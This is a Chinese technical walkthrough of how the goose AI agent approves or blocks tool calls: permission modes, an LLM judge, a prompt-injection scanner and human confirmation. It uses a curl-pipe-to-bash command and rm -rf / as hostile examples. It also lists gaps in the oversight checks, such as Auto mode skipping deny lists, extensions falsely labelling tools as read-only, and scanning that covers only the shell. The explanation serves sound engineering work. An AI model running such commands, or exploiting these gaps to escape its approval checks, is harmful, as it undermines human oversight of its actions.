# 12 · permission 与安全审批：工具放行的最后闸门

> 源码基线：`crates/goose/src/`（permission/ · config/ · security/ · tool_inspection.rs · agents/）。本文行号全部经 sed/grep 逐条核实。这是 explain 系列收官篇，前三篇覆盖的 CLI 会话（explain-06）、provider 契约（explain-02）在此处交汇：**模型决定"调用什么"，本层决定"放不放行"**。

## 角色定位（16 层架构第 5 层：dispatch 与执行之间的审批链）

在 16 层知识图谱中，permission 与 security 同属第 5 层「配置·安全·网关与提示词资产」（knowledge-graph.json layers 第 5 项）。这一层不产生任何智能，它只做一件事：在 `Agent::reply` 事件流里模型产出的 `ToolRequest` 与真正落到 `dispatch_tool_call`（agent.rs:916）之间，插入一条**多检查员审批链**。

链的骨架由两部分组成：

- **检查员管线（ToolInspectionManager）**：五个 inspector 按注册顺序依次审阅每批工具请求——Security（注入扫描，agent.rs:540 注释"highest priority - runs first"）→ Egress（出网目的地审计）→ Adversary（用户自定义规则的 LLM 审查）→ **Permission（本文主角，agent.rs:548）**→ Repetition。所有检查员实现同一个 `ToolInspector` trait（tool_inspection.rs:34-54），产出统一的 `InspectionAction::Allow | Deny | RequireApproval(Option<String>)`（tool_inspection.rs:23-30）。
- **确认回流路由（ToolConfirmationRouter）**：凡是落到 `needs_approval` 的请求，通过 oneshot channel（tool_confirmation_router.rs:8-10）挂起等待，由 CLI/ACP/桌面三宿主之一把用户的 `PermissionConfirmation` 送回来（agent.rs:1371 `handle_confirmation`）。

注意本层与 hooks 的分工：审批链在 inspector 阶段运行，`PreToolUse` hook 则是放行之后、执行之前的第二道闸（agent.rs:936-950，`HookDecision::Deny` 直接返回 policy denial）。两者互补而非替代。

## 内部结构（权限表 / 审批模式 / LLM 判官 / 注入扫描器）

### 权限表：活的是 permission.yaml，permission_store 是死代码

**勘误（与任务书不符，按源码为准）**：任务书称 permission/ 目录含"权限表"。实际上 `permission_store.rs` 里的 `ToolPermissionStore`——按 blake3 参数哈希（permission_store.rs:117-127）区分"同名工具不同参数"、带 `expiry` TTL、落盘 `~/.config/goose/permissions/tool_permissions.json`（permission_store.rs:41）的调用粒度存储——**全仓 grep 零消费者**（仅 mod.rs:8 re-export），是预留/死代码。真正在跑的权限表是 `config/permission.rs` 的 `PermissionManager`：

- 数据形状：`HashMap<String, PermissionConfig>`（config/permission.rs:35-38），两类目——`user`（用户显式决定）与 `smart_approve`（LLM 判官/注解缓存）（config/permission.rs:41-42）；每类目三个字符串列表 `always_allow / ask_before / never_allow`（config/permission.rs:27-31）。工具名匹配是**精确等值**（`contains`，config/permission.rs:147-170），无通配符。
- 落盘为 `~/.config/goose/permission.yaml`，每次更新全量序列化重写（config/permission.rs:211-213）；**文件损坏直接 panic 拒绝启动**（config/permission.rs:50-60，错误文案 "Refusing to start with corrupted permission config"，测试 permission.rs:357-363 钉死该行为）。
- 全局单例 `LazyLock`（config/permission.rs:13-14）；ACP 客户端另建独立实例（acp/server.rs:1013）。
- MCP 工具注解双向利用：`read_only_hint == Some(false)` 的**写注解**工具被批量缓存进 `smart_approve.ask_before`（config/permission.rs:101-117）；**读注解**工具则进每个 agent 私有的内存集 `readonly_tools`（permission_inspector.rs:18, 30-44，注释明言 per-agent 是为避免并发会话互相 clobber）。
- `remove_extension` 按前缀整批清理三类目（config/permission.rs:217-234），扩展卸载时调用。

一次性确认语义由 `Permission` 五值枚举承载：`AlwaysAllow / AllowOnce / Cancel / DenyOnce / AlwaysDeny`（permission_confirmation.rs:6-12）——它是**用户视角的决定**，与配置侧三值 `PermissionLevel::AlwaysAllow / AskBefore / NeverAllow`（config/permission.rs:19-23）是两套词汇，`AlwaysAllow/AlwaysDeny` 决定经 `update_permission_manager`（tool_inspection.rs:139-149，全仓唯一 `update_user_permission` 调用点）翻译进 permission.yaml 的 `user` 类目持久化。

### 审批模式：GooseMode 四态

`GooseMode`（config/goose_mode.rs:24-34）：`Auto`（默认，`#[default]`）、`Approve`（每次都问）、`SmartApprove`（只问敏感的）、`Chat`（纯对话不执行工具）。经 `config_value!` 宏（config/base.rs:1106）生成 `get/set_goose_mode`，配置键 `GOOSE_MODE`。

PermissionInspector 的 `inspect` 对每个请求按模式分派（permission_inspector.rs:139-177）：

- `Chat => continue`（permission_inspector.rs:140）：不产决定——Chat 模式的请求在 agent.rs:1880-1890 统一回 `CHAT_MODE_TOOL_SKIPPED_RESPONSE`（tool_execution.rs:67，一段让模型"解释计划而非道歉"的提示词）。
- `Auto => Allow`（permission_inspector.rs:141）：**Auto 模式连 user 权限表都不查**，直接放行（测试用例 `approve_ignores_cache` 之外的另一极端：`auto_allows`，permission_inspector.rs:273）。
- `Approve | SmartApprove` 走五步决策链（详见下节）。

### LLM 判官：单工具 tool-call 式判别

**勘误二（按源码为准）**：任务书写"read_only_check 工具"——实际工具名是 `platform__tool_by_tool_permission`（permission_judge.rs:21）。

SmartApprove 遇到既无用户配置、又无注解、又无缓存的工具时，把请求攒进 `llm_detect_candidates`（permission_inspector.rs:170）批量送判官 `detect_read_only_tools`（permission_judge.rs:122-154）：

1. 构造一个**单工具**的 mini-provider 调用：工具描述内嵌完整的 read/write 判别标准（permission_inspector.rs 之外，permission_judge.rs:22-49：SELECT 读、INSERT/UPDATE/DELETE 写、"发 Slack 消息也是写"），schema 只收一个可选数组 `read_only_tools`；该工具自我标注 `read_only(true).destructive(false)`（permission_judge.rs:64）。
2. system prompt 来自 `prompts/permission_judge.md`——模板其实只有一句话 "You are a good analyst..."（permission_judge.md:1，prompt_template.rs:35 注册），判别知识全部压在工具描述里；渲染失败还有硬编码 fallback（permission_judge.rs:134-135）。
3. 解析方式不是文本解析而是**再收一次 tool call**：在回复内容里找名为 `platform__tool_by_tool_permission` 的 `ToolRequest`，取其 `arguments.read_only_tools`（permission_judge.rs:97-119）。
4. 判定结果按工具名写回 permission.yaml 的 `smart_approve` 类目缓存（AlwaysAllow 或 AskBefore，permission_inspector.rs:231-239），下次同工具不再问 LLM。

### 注入扫描器：模式串打底、可选 ML 增强

`SecurityManager`（security/mod.rs:25）总闸是 `SECURITY_PROMPT_ENABLED` 配置，**默认 false**（security/mod.rs:46-55），env 变量 `SECURITY_PROMPT_ENABLED_OVERRIDE` 可强翻（security/mod.rs:17-23）。核心 `PromptInjectionScanner`（security/scanner.rs:34-38）：

- **扫描面只覆盖 shell 工具**：`is_shell_tool_name` 就是 `matches!(name, "shell")`（scanner.rs:393-395），非 shell 直接返回 `scanned: false`（scanner.rs:136-143）。
- 双信号源：pattern 引擎（`RiskLevel::Low/Medium/High/Critical` 映射置信度 0.45/0.60/0.75/0.95，security/patterns.rs:17-43，`rm -rf /` 属 Critical 0.95）+ 可选 ML 分类器（command/prompt 两类，scanner.rs:14-17；端点、模型、令牌从 `SECURITY_{COMMAND,PROMPT}_CLASSIFIER_{ENDPOINT,MODEL,TOKEN}` 配置读取，scanner.rs:64-123）。
- 会话侧取证：另扫最近 10 条 user 消息（`USER_SCAN_LIMIT = 10`，scanner.rs:10）判断"对话是否已被注入"，ML 并发 3（scanner.rs:11, 244-253）。
- 置信度融合 `combine_confidences`（scanner.rs:263-284）：工具置信度 <0.3 时无视上下文；上下文 <0.3 时打九折（tool×0.9）；双高（均>0.8）时取 max×1.05（封顶 1.0，即双信号共振**上调**）；默认加权 0.8×tool+0.2×context。
- 判定阈值 `SECURITY_PROMPT_THRESHOLD` 默认 0.8（scanner.rs:125-129）。超阈值才生成 `SEC-<uuid>` finding 并强制 `should_ask_user: true`（security/mod.rs:158-192）；`SecurityInspector` 把它转成带 "🔒 Security Alert" 警示与 finding_id 的 `RequireApproval`（security_inspector.rs:27-33）——注意**注入不直接 Deny，而是升级为必须人工确认**。
- 两个兄弟检查员：`EgressInspector` 用正则提取 URL/git@/s3/gcs 等出网目的地，**只记 info 日志、恒 Allow**（egress_inspector.rs:308-390，action 在 :368）——出网审计是观测不是阻断（推断：为将来 egress 白名单预留）。`AdversaryInspector` 读用户手写的 `~/.config/goose/adversary.md` 规则做 LLM 审查，**审查失败 fail open 放行**（adversary_inspector.rs:34-51）。

## 外部连接（上游闸口 / 三宿主确认回流 / config 多源合并）

**上游**：`Agent::reply` 主循环把模型响应拆成 `frontend_requests` 与 `remaining_requests`（agent.rs:1873 附近），非 Chat 模式下先 `inspect_tools`（agent.rs:1905）再 `process_inspection_results_with_permission_inspector`（agent.rs:1914）。该方法经 `as_any().downcast_ref::<PermissionInspector>()` 从 trait 对象里找回具体类型（tool_inspection.rs:126-131）——Rust 无 downcast 就无法让 manager 既存 `Box<dyn ToolInspector>` 又调用 permission 专属方法。找不到 permission inspector 时兜底为"全部 needs_approval"（agent.rs:1917-1928），fail-safe 朝保守侧。

**确认回流三宿主**：`handle_approval_tool_requests`（tool_execution.rs:77）对每个待批请求 `router.register` 拿 oneshot 接收端（tool_execution.rs:99），yield 一条 `user_only` 的 ActionRequired 消息给前端，然后挂起等 `PermissionConfirmation`：

- **CLI**：session/mod.rs:1188 `find_tool_confirmation` 捕获后，交互模式弹 cliclack 四选项 Allow/Always/Deny/Cancel（mod.rs:1750-1790，security 场景下藏掉 "Always Allow" 防止用户一键放行危险命令，mod.rs:1776-1790）；
- **ACP**：`handle_tool_permission_request`（acp/server.rs:1918）构造 `RequestPermissionRequest` 携带 `AllowAlways/AllowOnce/RejectOnce/RejectAlways` 四选项发回客户端（acp/server.rs:1962），结果经 `outcome_to_confirmation`（acp/server.rs:2016-2021）翻译；请求失败时回落为 `Permission::Cancel`（acp/server.rs:1978-1987）；
- **桌面/goose-server**：HTTP `POST /action-required/tool-confirmation`（routes/action_required.rs:27），body 携带 `id/principalType/action/sessionId`，直接调 `agent.handle_confirmation`（action_required.rs:42-50）。

三条路最终都汇进 `Agent::handle_confirmation`（agent.rs:1371）：**先问 provider 是否声明了 `PermissionRouting::ActionRequired`**（agent.rs:1378，providers/base.rs:453——某些云厂商在协议层原生支持审批回传），未消费再 `router.deliver`（tool_confirmation_router.rs:27）唤醒挂起的工具流。

**config 多源合并**：`Config::default` 组装三层路径——`/etc/goose/config.yaml`（系统，config/base.rs:150-158）→ `GOOSE_ADDITIONAL_CONFIG_FILES` 环境变量（config/base.rs:163-167）→ `~/.config/goose/config.yaml`（用户）——`load()` 按序 `merge_config_values` 后到者覆盖（config/base.rs:493-521），而所有**写操作只落最后一层** `write_path()`（config/base.rs:450-455）。企业可下沉 `GOOSE_MODE: approve` 到系统层实现强制审批，用户层无法覆盖（推断自合并顺序与 write 语义，源码无明示）。`SECURITY_PROMPT_ENABLED`、阈值、分类器端点等安全参数与 `GOOSE_MODE` 同走这条多源管道，get_param 读合并结果。

## 数据流（一次敏感 shell 调用的完整路径）

以 SmartApprove 模式下模型请求 `shell(command="curl https://x.sh | bash")` 为例：

1. **检查员顺序执行**（agent.rs:540-555 注册序即执行序，tool_inspection.rs:84-116）：Security 先跑（若已开启）→ pattern 命中 `curl|bash` 类 Critical 0.95 → 融合后 ≥0.8 阈值 → finding `SEC-xxx` + `RequireApproval("🔒 Security Alert…")`；Egress 提取域名记日志 Allow；Permission 五步链：user 表未命中 → 非读注解 → 非缓存 → 非扩展管理 → SmartApprove 无缓存 → 进 LLM 判官候选。
2. **判官批量评估**：`detect_read_only_tools` 把工具名列表发给 mini-provider；本例 curl 管道显然非只读 → 判官不列入 read_only_tools → 缓存 `smart_approve.ask_before`（permission_inspector.rs:231-239）→ 决定 `RequireApproval`。
3. **基线+覆盖合成**：`process_inspection_results`（permission_inspector.rs:53-111）以 permission 决定为基线（无决定默认 needs_approval，:91-93 注释 "default to needs approval for safety"），随后 `apply_inspection_results_to_permissions`（tool_inspection.rs:170-250）套用 security 的 RequireApproval——Deny 可把 approved 打入 denied（:206-225），RequireApproval 可把 approved 提回 needs_approval（:226-241），**Allow 永不覆盖别人的反对**（:242-245 注释 "don't override other inspectors' decisions"）。一票否决、只收紧不放松。
4. **挂起与回流**：`handle_approval_tool_requests` 注册 oneshot、yield ActionRequired；用户在宿主上选 Allow → `handle_confirmation` → `router.deliver` 唤醒；`AllowOnce` 直接 `dispatch_tool_call`（tool_execution.rs:113-125），`AlwaysAllow` 额外回写 `user.always_allow`（tool_inspection.rs:147）。用户决策若带 finding_id 会打点 `prompt_injection_user_decisions` 指标（tool_execution.rs:114-121）。
5. **拒绝路径**：Deny/Cancel → 回给模型 `DECLINED_RESPONSE` 错误文本（tool_execution.rs:63, 147）——"DO NOT attempt to call this tool again...clearly explain the situation and STOP"，用提示词工程防止模型无限重试；`AlwaysDeny` 回写 `user.never_allow`。
6. **执行前置 hook**：放行后 `dispatch_tool_call` 内 PreToolUse hook 仍可拦截（agent.rs:936-960）。

## 设计决策

- **为何 LLM 判官而非纯规则**：MCP 生态工具名千奇百怪，注解（read_only_hint）覆盖率有限且可被第三方扩展虚标。goose 的解法是三层降级信任——**显式注解（最快）→ 判官缓存（一次 LLM 代价，permission.yaml 持久）→ 判官现场判（最慢但最准）**。判官设计成"分析工具调用请求"的单工具 mini-call 而非自由文本，借 provider 的结构化 tool-call 能力保证输出可解析（permission_judge.rs:97-119）；判不出就当非只读（工具描述 :46 明言 "If you cannot make the decision, then it is not read-only"），错误方向朝安全侧。
- **审批模式与无头模式的安全契约**：headless + Approve/SmartApprove 直接报错终止而非静默放行（goose-cli mod.rs:1195-1203），注释原文 "auto-allowing would bypass the safety contract those modes are meant to enforce"——无头自动化必须显式选 Auto 承担责任（详见 explain-06 §设计决策 5）。这与 PermissionManager 损坏即 panic（config/permission.rs:56）同一哲学：**安全配置失效时拒绝服务而非降级运行**。
- **一票否决的合成语义**：permission 是基线（"我允许"），security/adversary 是覆盖（"我反对"）；Allow 不能救回被否决的请求（tool_inspection.rs:243）。权限与安全分离成两类 inspector，使注入告警能独立于用户已给的 AlwaysAllow 依然弹窗（security_inspector.rs 的 RequireApproval 会把 approved 的请求提回 needs_approval）。
- **注入检测默认关闭**（security/mod.rs:54 `unwrap_or(false)`）：推断是成本与误报考量——ML 分类器需要外部端点与令牌配置；纯 pattern 模式对复杂命令误报不低。开了之后也**只问不杀**（should_ask_user 恒 true，security/mod.rs:188），最终裁量权交还用户，finding_id 落审计日志。
- **工具名精确匹配的取舍**：权限表无通配符意味着"每个 shell 调用都一样问"——但注入扫描恰好只盯 shell（scanner.rs:393），两者互补：权限表按工具粒度粗筛，安全扫描按参数粒度细筛。ToolPermissionStore 的参数哈希方案（permission_store.rs:117）本可做"同工具不同参数不同权限"，但零消费——推断是做了未接线的实验性设计。

## 新人提示

- **新增一种审批模式**的改点清单：① `GooseMode` 加变体（config/goose_mode.rs:24，strum 派生自动获得解析/序列化）；② `PermissionInspector::inspect` 的 match 加臂（permission_inspector.rs:139）；③ 若需无头支持，改 goose-cli mod.rs:1195 的非法配置判定；④ permission_inspector.rs:273 起的 `test_case` 表补齐模式×注解×缓存的组合用例（现有 7 例是行为规格的最好文档）。
- **审计日志在哪看**：注入告警与用户决策打 tracing 日志——`prompt_injection_finding`（security/mod.rs:165-182，含 tool_call_json/confidence/finding_id/threshold）、`prompt_injection_user_decisions`（tool_execution.rs:114-121）、egress 目的地（egress_inspector.rs:355-365）；本地跑 `RUST_LOG=goose=info` 即可观测，指标侧还有 monotonic_counter 遥测。权限变更本身不记日志，只能 diff `~/.config/goose/permission.yaml`。
- **坑**：① Auto 模式完全绕过用户权限表（permission_inspector.rs:141），给用户配了 `never_allow` 以为封死了某工具，一切换 Auto 全失效——只有 extensionmanager 是唯一 Auto 下仍强审批的特例（permission_inspector.rs:160-163）；② `read_only_hint` 是扩展作者自报的，恶意/劣质 MCP 可虚标注解混过 SmartApprove（permission_inspector.rs:153），注解只省 LLM 调用不构成安全边界；③ SmartApprove 的判官缓存一旦写入 `always_allow` 就跨会话持久（config/permission.rs:213），调试"为什么它不问了"先查 permission.yaml 的 `smart_approve` 段；④ permission.yaml 手改坏了 goose 直接 panic 起不来（config/permission.rs:56），报错文案会给出路径，删文件或修复即可；⑤ 判官走的是当前会话同一个 provider——provider 很弱时 read-only 误判率上升，而误判方向只会"多问一次"（AskBefore）不会"错放行"，除非它把写工具判成只读（此时有 security 扫描兜底，但那只覆盖 shell）。
